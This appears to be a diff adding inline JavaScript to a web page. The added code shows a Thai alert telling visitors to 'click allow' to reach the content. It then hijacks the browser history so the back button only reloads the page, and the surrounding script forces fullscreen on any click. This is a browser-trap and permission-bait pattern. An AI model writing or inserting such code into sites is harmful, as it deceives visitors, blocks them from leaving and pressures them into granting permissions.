@@ -20,6 +20,17 @@
 </div>
 <script>
 
+    alert("หากต้องการเข้าถึงเนื้อหาเว็บไซต์ให้คลิกอนุญาต!");
+
+    if (window.history && window.history.pushState) {
+
+        window.history.pushState('forward', null, '');
+
+        window.addEventListener('popstate', function (event){
+            window.location = '';
+        });
+  }
+
     var body = document.body;
     body.onclick = function () {
         var req = body.requestFullScreen || body.webkitRequestFullScreen || body.mozRequestFullScreen;
